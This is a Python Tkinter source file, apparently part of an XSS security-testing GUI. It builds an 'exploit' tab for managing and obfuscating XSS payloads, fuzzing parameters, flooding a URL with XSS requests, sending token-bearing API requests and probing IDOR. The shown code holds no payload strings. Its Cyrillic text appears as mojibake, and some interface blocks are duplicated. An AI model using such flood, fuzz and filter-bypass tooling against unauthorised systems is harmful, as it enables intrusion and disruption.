# === xss_security_gui/exploit_tab.py (—á–∞—Å—Ç–∏–Ω–∞ 1)===

from __future__ import annotations

import ast
import copy
import csv
import datetime
import html
import json
import os
import random
import threading
import time
import urllib.parse
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, List, Optional

import requests
import tkinter as tk
from requests.adapters import HTTPAdapter
from tkinter import filedialog, messagebox, ttk
from tkinter.scrolledtext import ScrolledText
from urllib3.util.retry import Retry

from xss_security_gui.payloads import gen_payloads_from_templates
from xss_security_gui.auto_recon.xss_flooder import start_flood
from xss_security_gui.config_loader import _safe_load_json
from xss_security_gui.config_manager import CONFIG, CRAWLER_RESULTS_PATH, DEEP_CRAWL_JSON_PATH
from xss_security_gui.honeypot_monitor import start_honeypot
from xss_security_gui.payload_generator import (
    generate_payloads as gen_payloads_from_templates,
    generate_variants,
    generate_payloads
)
from xss_security_gui.payloads import PAYLOAD_CATEGORIES, get_random_payload, get_stats
from xss_security_gui.settings import PAYLOAD_DB_PATH
from xss_security_gui.utils.core_utils import normalize_url
from xss_security_gui.utils.network import TokenBucket, create_retry_session
from xss_security_gui.xss_attacker import XSSAttacker
from xss_security_gui.xss_detector import XSSDetector
from xss_security_gui.utils.threat_sender import ThreatSenderMixin


# === –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ ===

@dataclass
class SafetyConfig:
    tester_id: str = "SecurityTest/1.0 (contact: set-me)"
    allowlist: List[str] = field(default_factory=list)
    max_rps: float = 1.0
    max_concurrency: int = 2
    max_run_minutes: float = 30.0
    error_stop_ratio: float = 0.2
    response_log_cap: int = 5000
    require_consent: bool = True
    proxies: Dict[str, str] = field(default_factory=dict)


class PayloadMixin:
    """–ú–∏–∫—Å–∏–Ω –¥–ª—è —Ä–∞–±–æ—Ç—ã —Å XSS payload'–∞–º–∏ –∏ –∏—Ö –±–∞–∑–æ–π."""

    # –ø—ñ–¥–∫–∞–∑–∫–∏ –¥–ª—è IDE
    payload_combo: ttk.Combobox
    category_combo: ttk.Combobox
    payload_box: tk.Text
    custom_payload_entry: ttk.Entry
    payload_text: tk.Text
    response_box: tk.Text
    log: callable
    update_payloads: callable

    def insert_payload(self) -> None:
        """–í—Å—Ç–∞–≤–ª—è–µ—Ç –≤—ã–±—Ä–∞–Ω–Ω—ã–π payload –∏–∑ —à–∞–±–ª–æ–Ω–æ–≤ –≤ –ø–æ–ª–µ payload_box."""
        sel = self.payload_combo.get()
        payloads = gen_payloads_from_templates()
        if sel in payloads:
            self.payload_box.delete("1.0", "end")
            self.payload_box.insert("end", payloads[sel])
            self.log(f"[üì¶] –í—Å—Ç–∞–≤–ª–µ–Ω payload: {sel}")
        else:
            self.log("[‚ö†Ô∏è] Payload –Ω–µ –Ω–∞–π–¥–µ–Ω –≤ –±–∞–∑–µ", level="warning")

    def insert_random_payload(self) -> None:
        """–í—Å—Ç–∞–≤–ª—è–µ—Ç —Å–ª—É—á–∞–π–Ω—ã–π payload –∏–∑ –≤—ã–±—Ä–∞–Ω–Ω–æ–π –∫–∞—Ç–µ–≥–æ—Ä–∏–∏."""
        category = self.category_combo.get()
        payload = get_random_payload(category)
        self.payload_box.delete("1.0", "end")
        self.payload_box.insert("end", payload)
        self.log(f"[üé≤] –°–ª—É—á–∞–π–Ω—ã–π payload –∏–∑ {category}")

    def save_custom_payload(self) -> None:
        """–°–æ—Ö—Ä–∞–Ω—è–µ—Ç –∫–∞—Å—Ç–æ–º–Ω—ã–π payload –≤ JSON-–±–∞–∑—É –ø–æ –≤—ã–±—Ä–∞–Ω–Ω–æ–π –∫–∞—Ç–µ–≥–æ—Ä–∏–∏."""
        category = self.category_combo.get()
        payload = self.custom_payload_entry.get().strip()
        if not payload:
            messagebox.showerror("–û—à–∏–±–∫–∞", "–ü–æ–ª–µ payload –ø—É—Å—Ç–æ–µ.")
            return

        try:
            if os.path.exists(PAYLOAD_DB_PATH):
                with open(PAYLOAD_DB_PATH, "r", encoding="utf-8") as f:
                    db = json.load(f)
            else:
                db = {}

            db.setdefault("categories", {}).setdefault(category, []).append(payload)

            with open(PAYLOAD_DB_PATH, "w", encoding="utf-8") as f:
                json.dump(db, f, indent=2, ensure_ascii=False)

            messagebox.showinfo("‚úÖ –°–æ—Ö—Ä–∞–Ω–µ–Ω–æ", f"Payload –¥–æ–±–∞–≤–ª–µ–Ω –≤ –∫–∞—Ç–µ–≥–æ—Ä–∏—é {category}")
            self.custom_payload_entry.delete(0, "end")
            self.update_payloads()
            self.log(f"[üíæ] –ù–æ–≤—ã–π payload —Å–æ—Ö—Ä–∞–Ω—ë–Ω –≤ {category}")
        except Exception as e:
            messagebox.showerror("–û—à–∏–±–∫–∞ –∑–∞–ø–∏—Å–∏", f"–ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å: {e}")
            self.log(f"[‚ùå] –û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è payload: {e}", level="error")

    def show_all_payloads(self) -> None:
        """–ü–æ–∫–∞–∑—ã–≤–∞–µ—Ç –≤—Å–µ payload'—ã –≤—ã–±—Ä–∞–Ω–Ω–æ–π –∫–∞—Ç–µ–≥–æ—Ä–∏–∏ –≤ payload_text."""
        category = self.category_combo.get()

        try:
            # –ó–∞–≥—Ä—É–∂–∞–µ–º –±–∞–∑—É –ø–µ–π–ª–æ–∞–¥–æ–≤
            if os.path.exists(PAYLOAD_DB_PATH):
                with open(PAYLOAD_DB_PATH, "r", encoding="utf-8") as f:
                    db = json.load(f)
            else:
                db = {"categories": {}}

            # –ü–æ–ª—É—á–∞–µ–º —Å–ø–∏—Å–æ–∫ –ø–µ–π–ª–æ–∞–¥–æ–≤ –¥–ª—è –≤—ã–±—Ä–∞–Ω–Ω–æ–π –∫–∞—Ç–µ–≥–æ—Ä–∏–∏
            payloads = db.get("categories", {}).get(category, [])

            if not payloads:
                messagebox.showinfo("‚ö†Ô∏è –ü—É—Å—Ç–æ", f"–ù–µ—Ç –ø–µ–π–ª–æ–∞–¥–æ–≤ –≤ –∫–∞—Ç–µ–≥–æ—Ä–∏–∏: {category}")
                self.log(f"[‚ö†Ô∏è] –ö–∞—Ç–µ–≥–æ—Ä–∏—è {category} –ø—É—Å—Ç–∞", level="warning")
                return

            # –û–±–Ω–æ–≤–ª—è–µ–º —Ç–µ–∫—Å—Ç–æ–≤–æ–µ –ø–æ–ª–µ
            self.payload_text.delete("1.0", "end")
            self.payload_text.insert("1.0", "\n".join(payloads))

            self.log(f"[üìÇ] –ó–∞–≥—Ä—É–∂–µ–Ω–æ {len(payloads)} payload‚Äô–æ–≤ –∏–∑ –∫–∞—Ç–µ–≥–æ—Ä–∏–∏ {category}", level="success")

        except Exception as e:
            messagebox.showerror("–û—à–∏–±–∫–∞", f"–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å payload_db.json:\n{e}")
            self.log(f"[‚ùå] –û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ –±–∞–∑—ã payload: {e}", level="error")

    def show_stats(self) -> None:
        """–û—Ç–æ–±—Ä–∞–∂–∞–µ—Ç —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É –ø–æ –±–∞–∑–µ payload'–æ–≤ –≤ response_box."""
        stats = get_stats()
        self.response_box.delete("1.0", "end")
        self.response_box.insert("end", "üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –±–∞–∑—ã Payload‚Äô–æ–≤:\n\n")
        for cat, count in stats.items():
            self.response_box.insert("end", f"üì¶ {cat}: {count} –ø–µ–π–ª–æ–∞–¥–æ–≤\n")
        self.log("[üìä] –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –±–∞–∑—ã payload –æ–±–Ω–æ–≤–ª–µ–Ω–∞")

    def obfuscate_payload(self) -> None:
        """–ì–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç –≤–∞—Ä–∏–∞–Ω—Ç—ã –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏ –¥–ª—è —Ç–µ–∫—É—â–µ–≥–æ payload."""
        selected = self.payload_box.get("1.0", "end").strip()

        if not selected:
            self.log("[‚ö†Ô∏è] –ù–µ—Ç –≤—ã–±—Ä–∞–Ω–Ω–æ–≥–æ payload –¥–ª—è –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏", level="warning")
            return

        try:
            variants = generate_variants(selected)

            if not variants:
                self.response_box.delete("1.0", "end")
                self.response_box.insert("end", "‚ö†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å —Å–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞—Ç—å –≤–∞—Ä–∏–∞–Ω—Ç—ã –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏.\n")
                self.log("[‚ö†Ô∏è] –ì–µ–Ω–µ—Ä–∞—Ç–æ—Ä –Ω–µ –≤–µ—Ä–Ω—É–ª –≤–∞—Ä–∏–∞–Ω—Ç–æ–≤", level="warning")
                return

            # –û—á–∏—Å—Ç–∫–∞ –∏ –≤—ã–≤–æ–¥ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤
            self.response_box.delete("1.0", "end")
            self.response_box.insert("end", "üß¨ –í–∞—Ä–∏–∞–Ω—Ç—ã –æ–±—Ö–æ–¥–∞:\n\n")
            for i, v in enumerate(variants, 1):
                self.response_box.insert("end", f"{i:02d}. {v}\n")

            self.log(f"[üß¨] –°–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω–æ {len(variants)} –≤–∞—Ä–∏–∞–Ω—Ç–æ–≤ –¥–ª—è –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏", level="success")

        except Exception as e:
            self.log(f"[‚ùå] –û—à–∏–±–∫–∞ –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ –≤–∞—Ä–∏–∞–Ω—Ç–æ–≤: {e}", level="error")
            messagebox.showerror("–û—à–∏–±–∫–∞", f"–ù–µ —É–¥–∞–ª–æ—Å—å —Å–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞—Ç—å –≤–∞—Ä–∏–∞–Ω—Ç—ã:\n{e}")


class ExploitTab(ttk.Frame, ThreatSenderMixin, PayloadMixin):
    """
    ExploitTab ‚Äî –≤–∫–ª–∞–¥–∫–∞ –¥–ª—è –∞–∫—Ç–∏–≤–Ω—ã—Ö –∞—Ç–∞–∫ / PoC:
    - API‚Äë—Ç–µ—Å—Ç—ã
    - XSS‚Äë–∞—Ç–∞–∫–∏ (flood, fuzz)
    - IDOR‚Äë–ø—Ä–æ–≤–µ—Ä–∫–∏
    - Honeypot‚Äë–º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥
    - –ò–Ω—Ç–µ–≥—Ä–∞—Ü–∏—è —Å ThreatConnector —á–µ—Ä–µ–∑ ThreatSenderMixin
    """

    def __init__(self, parent, threat_tab=None, *args, **kwargs):
        super().__init__(parent, *args, **kwargs)
        self.threat_tab = threat_tab

        # === –°–∏—Å—Ç–µ–º–Ω—ã–µ –ø–æ–ª—è ===
        self.success_count: int = 0
        self.api_list: List[str] = []
        self.token_list: List[str] = []
        self.all_payloads: List[str] = []
        self.attacker: Optional[XSSAttacker] = None
        self.xss_results: List[Dict[str, Any]] = []
        self.idor_results: List[Dict[str, Any]] = []
        self._iid_map: Dict[str, Dict[str, Any]] = {}
        self._recent: List[Dict[str, Any]] = []
        self._start_ts: float = time.time()

        self.safety = SafetyConfig()
        self._bucket = TokenBucket(self.safety.max_rps)
        self._sem = threading.Semaphore(self.safety.max_concurrency)
        self._req_idx_lock = threading.Lock()
        self._session = create_retry_session()
        self._stop_xss = threading.Event()

        # === GUI ===
        self.build_ui()

        # === –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è ===
        self.load_config()
        self.bind_hotkeys()

    # ==========================
    # –ü–æ–ª–Ω–æ—Ü–µ–Ω–Ω—ã–π –ª–æ–≥–µ—Ä
    def log(self, msg: str, level: str = "info") -> None:
        """
        –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ —Å–æ–æ–±—â–µ–Ω–∏–π –≤ –∫–æ–Ω—Å–æ–ª—å –∏ GUI.
        level: "info", "success", "warning", "error"
        """
        print(msg)

        if not hasattr(self, "response_box"):
            return

        def _append() -> None:
            # –ù–∞—Å—Ç—Ä–æ–π–∫–∞ —Ç–µ–≥–æ–≤ —Ç–æ–ª—å–∫–æ –æ–¥–∏–Ω —Ä–∞–∑
            if not self.response_box.tag_names():
                self.response_box.tag_config("info", foreground="white")
                self.response_box.tag_config("success", foreground="green")
                self.response_box.tag_config("warning", foreground="orange")
                self.response_box.tag_config("error", foreground="red")

            # –í—Å—Ç–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ —Å —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—â–∏–º —Ç–µ–≥–æ–º
            self.response_box.insert("end", msg + "\n", level)
            self.response_box.see("end")

        # –≥–∞—Ä–∞–Ω—Ç–∏—Ä—É–µ–º –≤—ã–∑–æ–≤ –≤ GUI-–ø–æ—Ç–æ–∫–µ
        try:
            self.after(0, _append)
        except Exception:
            # –µ—Å–ª–∏ –≤–∏–¥–∂–µ—Ç —É–∂–µ —É–Ω–∏—á—Ç–æ–∂–µ–Ω ‚Äî –ø—Ä–æ—Å—Ç–æ –∏–≥–Ω–æ—Ä–∏—Ä—É–µ–º
            pass

    # ==========================
    def update_payloads(self) -> None:
        """–û–±–Ω–æ–≤–ª—è–µ—Ç —Å–ø–∏—Å–æ–∫ –∫–∞—Ç–µ–≥–æ—Ä–∏–π payload –≤ –∫–æ–º–±–æ–±–æ–∫—Å–µ."""
        try:
            categories: List[str] = []

            if os.path.exists(PAYLOAD_DB_PATH):
                with open(PAYLOAD_DB_PATH, "r", encoding="utf-8") as f:
                    db = json.load(f)
                categories = list(db.get("categories", {}).keys())

            if not categories:
                categories = list(PAYLOAD_CATEGORIES.keys())

            self.category_combo["values"] = categories
            if categories and not self.category_combo.get():
                self.category_combo.set(categories[0])

            self.log("[üîÑ] Payload –∫–∞—Ç–µ–≥–æ—Ä–∏–∏ –æ–±–Ω–æ–≤–ª–µ–Ω—ã", level="info")
        except Exception as e:
            self.log(f"[‚ùå] –û—à–∏–±–∫–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è payload: {e}", level="error")

    # ==========================
    def load_config(self, path: Optional[str] = None) -> None:
        """–ó–∞–≥—Ä—É–∂–∞–µ—Ç –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—é ExploitTab –∏ –æ–±–Ω–æ–≤–ª—è–µ—Ç –ª–∏–º–∏—Ç—ã/–ø—Ä–æ–∫—Å–∏."""
        cfg_path = path or CONFIG.get("exploit_config_path", "config.json")
        try:
            if os.path.exists(cfg_path):
                with open(cfg_path, encoding="utf-8") as f:
                    cfg = json.load(f)

                self.safety.allowlist = cfg.get("allowlist", self.safety.allowlist)
                self.safety.max_rps = float(cfg.get("max_rps", self.safety.max_rps))
                self.safety.max_concurrency = int(cfg.get("max_concurrency", self.safety.max_concurrency))
                self.safety.proxies = cfg.get("proxies", self.safety.proxies)

                self._bucket = TokenBucket(self.safety.max_rps)
                self._sem = threading.Semaphore(self.safety.max_concurrency)

                if hasattr(self, "timeout_spin"):
                    self.timeout_spin.set(str(cfg.get("timeout", 8)))
                if hasattr(self, "rate_spin"):
                    self.rate_spin.set(str(cfg.get("rate_limit", self.safety.max_rps)))
        except Exception as e:
            self.log(f"[config] –æ—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏: {e}", level="warning")

    def build_ui(self) -> None:
        # ====== –ë–ª–æ–∫: –≥–µ–Ω–µ—Ä–∞—Ç–æ—Ä –∏ –±–∞–∑–∞ payload'–æ–≤ ======
        gen_frame = ttk.LabelFrame(self, text="üì¶ XSS Payload Generator")
        gen_frame.pack(fill="x", padx=10, pady=5)

        # –ö–∞—Ç–µ–≥–æ—Ä–∏–∏ payload'–æ–≤
        category_frame = ttk.Frame(gen_frame)
        category_frame.pack(fill="x", pady=2)

        ttk.Label(category_frame, text="–ö–∞—Ç–µ–≥–æ—Ä–∏—è:").pack(side="left", padx=10)
        self.category_combo = ttk.Combobox(
            category_frame,
            values=PAYLOAD_CATEGORIES,
            state="readonly",
            width=30,
        )
        self.category_combo.pack(side="left", padx=10)
        if PAYLOAD_CATEGORIES:
            self.category_combo.set(PAYLOAD_CATEGORIES[0])

        # –ü–æ–∏—Å–∫ –ø–æ payload'–∞–º (–µ—Å–ª–∏ –±—É–¥–µ—à—å —Ä–µ–∞–ª–∏–∑–æ–≤—ã–≤–∞—Ç—å filter_payloads)
        search_frame = ttk.Frame(gen_frame)
        search_frame.pack(fill="x", pady=2)

        ttk.Label(search_frame, text="üîç –ü–æ–∏—Å–∫:").pack(side="left", padx=10)
        self.search_entry = ttk.Entry(search_frame, width=40)
        self.search_entry.pack(side="left", padx=10)
        # self.search_entry.bind("<KeyRelease>", self.filter_payloads)
        # self.search_entry.bind("<Return>", self.insert_filtered_payload)

        # –í—ã–±—Ä–∞–Ω–Ω—ã–π payload
        payload_frame = ttk.Frame(gen_frame)
        payload_frame.pack(fill="x", pady=2)

        ttk.Label(payload_frame, text="üéØ –í—ã–±—Ä–∞–Ω–Ω—ã–π Payload:").pack(side="left", padx=10)
        self.payload_combo = ttk.Combobox(payload_frame, values=[], width=80)
        self.payload_combo.pack(side="left", padx=10)

        # –ö–∞—Å—Ç–æ–º–Ω—ã–π payload
        custom_frame = ttk.Frame(gen_frame)
        custom_frame.pack(fill="x", pady=2)

        ttk.Label(custom_frame, text="‚ûï –ö–∞—Å—Ç–æ–º–Ω—ã–π payload:").pack(side="left", padx=10)
        self.custom_payload_entry = ttk.Entry(custom_frame, width=60)
        self.custom_payload_entry.pack(side="left", padx=10)

        # –ö–Ω–æ–ø–∫–∏ —Ä–∞–±–æ—Ç—ã —Å payload'–∞–º–∏
        btn_frame = ttk.Frame(gen_frame)
        btn_frame.pack(fill="x", padx=5, pady=5)

        ttk.Button(btn_frame, text="üì¶ –í—Å—Ç–∞–≤–∏—Ç—å payload", command=self.insert_payload).pack(side="left", padx=5)
        ttk.Button(btn_frame, text="üé≤ –°–ª—É—á–∞–π–Ω—ã–π payload", command=self.insert_random_payload).pack(side="left", padx=5)
        ttk.Button(btn_frame, text="üíæ –°–æ—Ö—Ä–∞–Ω–∏—Ç—å", command=self.save_custom_payload).pack(side="left", padx=5)
        ttk.Button(btn_frame, text="üìÇ –í—Å–µ payload‚Äô—ã", command=self.show_all_payloads).pack(side="left", padx=5)
        ttk.Button(btn_frame, text="üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞", command=self.show_stats).pack(side="left", padx=5)
        ttk.Button(btn_frame, text="üß¨ –û–±—Ñ—É—Å–∫–∞—Ü–∏—è", command=self.obfuscate_payload).pack(side="left", padx=5)

        # –ü–æ–ª–µ –¥–ª—è –ø—Ä–æ—Å–º–æ—Ç—Ä–∞ –≤—Å–µ—Ö payload'–æ–≤ –∫–∞—Ç–µ–≥–æ—Ä–∏–∏
        self.payload_text = ScrolledText(gen_frame, height=8, bg="#1e1e1e", fg="white", wrap="word")
        self.payload_text.pack(fill="both", expand=True, padx=10, pady=5)

        # ====== –ë–ª–æ–∫: API Tools ======
        api_frame = ttk.LabelFrame(self, text="üîê API Tools")
        api_frame.pack(fill="x", padx=10, pady=5)

        def row(parent):
            r = ttk.Frame(parent)
            r.pack(fill="x", pady=2)
            return r

        r1 = row(api_frame)
        ttk.Label(r1, text="–ü–æ–ª–Ω—ã–π URL:").pack(side="left", padx=5)
        self.full_url_entry = ttk.Entry(r1, width=60)
        self.full_url_entry.pack(side="left", padx=5)

        r2 = row(api_frame)
        ttk.Label(r2, text="API Endpoint:").pack(side="left", padx=5)
        self.api_combo = ttk.Combobox(r2, values=[], width=60)
        self.api_combo.pack(side="left", padx=5)
        ttk.Button(r2, text="üìÇ –í—ã–±—Ä–∞—Ç—å JSON", command=self.select_json_file).pack(side="left", padx=5)

        r3 = row(api_frame)
        ttk.Label(r3, text="Auth Token:").pack(side="left", padx=5)
        self.token_combo = ttk.Combobox(r3, values=[], width=60)
        self.token_combo.pack(side="left", padx=5)

        r4 = row(api_frame)
        ttk.Label(r4, text="–ú–µ—Ç–æ–¥:").pack(side="left", padx=5)
        self.method_combo = ttk.Combobox(r4, values=["GET", "POST"], state="readonly", width=10)
        self.method_combo.pack(side="left", padx=5)
        self.method_combo.current(0)
        ttk.Button(r4, text="üîÑ –û–±–Ω–æ–≤–∏—Ç—å —Å–ø–∏—Å–æ–∫", command=self.load_scan_results).pack(side="left", padx=5)

        # JSON Payload –¥–ª—è API
        ttk.Label(self, text="JSON Payload (POST):").pack(anchor="w", padx=10)
        self.payload_box = tk.Text(self, height=6, bg="#1e1e1e", fg="lime", insertbackground="lime")
        self.payload_box.pack(fill="x", padx=10, pady=(0, 10))

        # ====== –ë–ª–æ–∫: –ü–∞–Ω–µ–ª—å —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –∞—Ç–∞–∫–∞–º–∏ ======
        control_frame = ttk.LabelFrame(self, text="üì° –ü–∞–Ω–µ–ª—å —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è")
        control_frame.pack(fill="x", padx=10, pady=10)

        ttk.Button(control_frame, text="üì§ –û—Ç–ø—Ä–∞–≤–∏—Ç—å API-–∑–∞–ø—Ä–æ—Å", command=self.send_api_request).pack(pady=4)
        ttk.Button(control_frame, text="üß™ –ü—Ä–æ–≤–µ—Ä–∏—Ç—å XSS-–ø–µ–π–ª–æ–∞–¥—ã", command=self.test_xss_payloads).pack(pady=4)

        xss_control_row = ttk.Frame(control_frame)
        xss_control_row.pack(pady=5)

        ttk.Button(
            xss_control_row,
            text="üöÄ –ó–∞–ø—É—Å—Ç–∏—Ç—å XSS-–ø–æ—Ç–æ–∫",
            command=self.start_xss_attack
        ).pack(side="left", padx=5)
        ttk.Button(
            xss_control_row,
            text="üõë –û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å XSS-–ø–æ—Ç–æ–∫",
            command=self.stop_xss_attack
        ).pack(side="left", padx=5)
        ttk.Button(
            xss_control_row,
            text="üß™ XSS Fuzz –ø–æ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞–º",
            command=self.run_xss_fuzzing
        ).pack(side="left", padx=5)
        ttk.Button(
            xss_control_row,
            text="üí£ XSS Flood –ø–æ URL",
            command=self.launch_flood
        ).pack(side="left", padx=5)

        interval_row = ttk.Frame(control_frame)
        interval_row.pack(pady=5)
        ttk.Label(interval_row, text="‚è± –ò–Ω—Ç–µ—Ä–≤–∞–ª –º–µ–∂–¥—É –∞—Ç–∞–∫–∞–º–∏ (—Å–µ–∫):").pack(side="left", padx=5)
        self.interval_entry = ttk.Entry(interval_row, width=10)
        self.interval_entry.insert(0, "1")
        self.interval_entry.pack(side="left", padx=5)

        ttk.Label(interval_row, text="‚è± Timeout:").pack(side="left", padx=5)
        self.timeout_spin = ttk.Spinbox(interval_row, from_=1, to=60, width=5)
        self.timeout_spin.set("8")
        self.timeout_spin.pack(side="left", padx=5)

        ttk.Label(interval_row, text="‚ö° RPS:").pack(side="left", padx=5)
        self.rate_spin = ttk.Spinbox(interval_row, from_=0, to=10, increment=0.1, width=5)
        self.rate_spin.set("1.0")
        self.rate_spin.pack(side="left", padx=5)

        # ====== –õ–æ–≥ –∏ –æ—Ç–≤–µ—Ç —Å–µ—Ä–≤–µ—Ä–∞ ======
        ttk.Label(self, text="üìã –õ–æ–≥ —Å–æ–±—ã—Ç–∏–π:").pack(anchor="w", padx=10)
        self.log_box = ScrolledText(self, height=8, bg="#1e1e1e", fg="white", wrap="word")
        self.log_box.pack(fill="both", expand=True, padx=10, pady=5)

        ttk.Label(self, text="üì§ –û—Ç–≤–µ—Ç —Å–µ—Ä–≤–µ—Ä–∞:").pack(anchor="w", padx=10)
        self.response_box = ScrolledText(self, height=10, bg="#1e1e1e", fg="white", wrap="word")
        self.response_box.pack(fill="both", expand=True, padx=10, pady=5)

        # ====== XSS –†–µ–∑—É–ª—å—Ç–∞—Ç—ã ======
        xss_frame = ttk.LabelFrame(self, text="üöÄ XSS –†–µ–∑—É–ª—å—Ç–∞—Ç—ã")
        xss_frame.pack(fill="both", padx=10, pady=5, expand=True)

        xss_table_frame = ttk.Frame(xss_frame)
        xss_table_frame.pack(fill="both", expand=True, padx=5, pady=5)

        xss_scrollbar = ttk.Scrollbar(xss_table_frame, orient="vertical")
        xss_scrollbar.pack(side="right", fill="y")

        self.xss_tree = ttk.Treeview(
            xss_table_frame,
            columns=("URL", "Status", "Reflected", "Length"),
            show="headings",
            height=10,
            yscrollcommand=xss_scrollbar.set
        )
        self.xss_tree.heading("URL", text="URL")
        self.xss_tree.heading("Status", text="Status")
        self.xss_tree.heading("Reflected", text="Reflected")
        self.xss_tree.heading("Length", text="Length")
        self.xss_tree.column("URL", width=400)
        self.xss_tree.column("Status", width=60, anchor="center")
        self.xss_tree.column("Reflected", width=80, anchor="center")
        self.xss_tree.column("Length", width=80, anchor="center")
        self.xss_tree.pack(fill="both", expand=True)
        xss_scrollbar.config(command=self.xss_tree.yview)

        self.xss_tree.tag_configure("reflected", background="#ffdddd")
        self.xss_tree.tag_configure("clean", background="#ddffdd")
        self.xss_tree.tag_configure("error", background="#eeeeee")

        # ====== IDOR Tools ======
        idor_frame = ttk.LabelFrame(self, text="üß™ IDOR Tools")
        idor_frame.pack(fill="both", padx=10, pady=5, expand=True)

        ttk.Button(idor_frame, text="üß™ –ü—Ä–æ—Ç–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å IDOR", command=self.run_idor_test).pack(pady=4)
        ttk.Button(idor_frame, text="üìÑ –≠–∫—Å–ø–æ—Ä—Ç IDOR –≤ CSV", command=self.export_idor_to_csv).pack(pady=4)

        self.status_filter = ttk.Combobox(idor_frame, values=["All", "200", "403", "404", "500"], state="readonly")
        self.status_filter.set("All")
        self.status_filter.pack(pady=4)
        self.status_filter.bind("<<ComboboxSelected>>", self.filter_idor_results)

        self.idor_tree = ttk.Treeview(idor_frame, columns=("URL", "Status", "Sensitive"), show="headings")
        self.idor_tree.heading("URL", text="URL")
        self.idor_tree.heading("Status", text="Status")
        self.idor_tree.heading("Sensitive", text="Sensitive")
        self.idor_tree.pack(fill="both", expand=True, padx=5, pady=5)
        self.idor_tree.tag_configure("sensitive", background="#ffcccc")
        self.idor_tree.tag_configure("normal", background="#ffffff")

        # –í –∫–æ–Ω—Ü–µ ‚Äî –æ–±–Ω–æ–≤–ª—è–µ–º –∫–∞—Ç–µ–≥–æ—Ä–∏–∏ payload'–æ–≤
        self.update_payloads()

        # ===== üì¶ XSS Payload Generator (—Ä–∞—Å—à–∏—Ä–µ–Ω–Ω—ã–π) =====
        gen_frame = ttk.LabelFrame(self, text="üì¶ XSS Payload Generator")
        gen_frame.pack(fill="x", padx=10, pady=5)

        category_frame = ttk.Frame(gen_frame)
        category_frame.pack(fill="x", pady=2)

        ttk.Label(category_frame, text="–ö–∞—Ç–µ–≥–æ—Ä–∏—è:").pack(side="left", padx=10)
        self.category_combo = ttk.Combobox(
            category_frame,
            values=PAYLOAD_CATEGORIES,
            state="readonly",
            width=30,
        )
        self.category_combo.pack(side="left", padx=10)
        if PAYLOAD_CATEGORIES:
            self.category_combo.set(PAYLOAD_CATEGORIES[0])
        self.category_combo.bind("<<ComboboxSelected>>", lambda e: self.update_payloads())

        search_frame = ttk.Frame(gen_frame)
        search_frame.pack(fill="x", pady=2)

        ttk.Label(search_frame, text="üîç –ü–æ–∏—Å–∫:").pack(side="left", padx=10)
        self.search_entry = ttk.Entry(search_frame, width=40)
        self.search_entry.pack(side="left", padx=10)
        self.search_entry.bind("<KeyRelease>", lambda e: self.filter_payloads())
        self.search_entry.bind("<Return>", lambda e: self.insert_filtered_payload())

        self.auto_attack_var = tk.BooleanVar(value=False)
        self.auto_attack_check = ttk.Checkbutton(
            gen_frame,
            text="‚è± –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –∑–∞–ø—É—Å–∫–∞—Ç—å –∞—Ç–∞–∫—É –ø–æ —Ñ–∏–ª—å—Ç—Ä—É",
            variable=self.auto_attack_var,
        )
        self.auto_attack_check.pack(anchor="w", padx=10, pady=5)

        payload_frame = ttk.Frame(gen_frame)
        payload_frame.pack(fill="x", pady=2)

        ttk.Label(payload_frame, text="üéØ –í—ã–±—Ä–∞–Ω–Ω—ã–π Payload:").pack(side="left", padx=10)
        self.payload_combo = ttk.Combobox(payload_frame, values=[], width=80)
        self.payload_combo.pack(side="left", padx=10)

        # üîΩ –ü–æ–ª–µ –≤–≤–æ–¥–∞ –∫–∞—Å—Ç–æ–º–Ω–æ–≥–æ payload'–∞
        entry_frame = ttk.Frame(gen_frame)
        entry_frame.pack(fill="x", pady=2)

        ttk.Label(entry_frame, text="üìù –ù–æ–≤—ã–π Payload:").pack(side="left", padx=10)
        self.custom_payload_entry = ttk.Entry(entry_frame, width=60)
        self.custom_payload_entry.pack(side="left", padx=10)
        ttk.Button(entry_frame, text="üíæ –°–æ—Ö—Ä–∞–Ω–∏—Ç—å", command=self.save_custom_payload).pack(side="left", padx=10)

        # ===== üì¶ –í—Å–µ Payload‚Äô—ã =====
        ttk.Label(self, text="üì¶ –í—Å–µ Payload‚Äô—ã:").pack(anchor="w", padx=10)
        self.payload_text = ScrolledText(self, height=10, bg="#1e1e1e", fg="white", wrap="word")
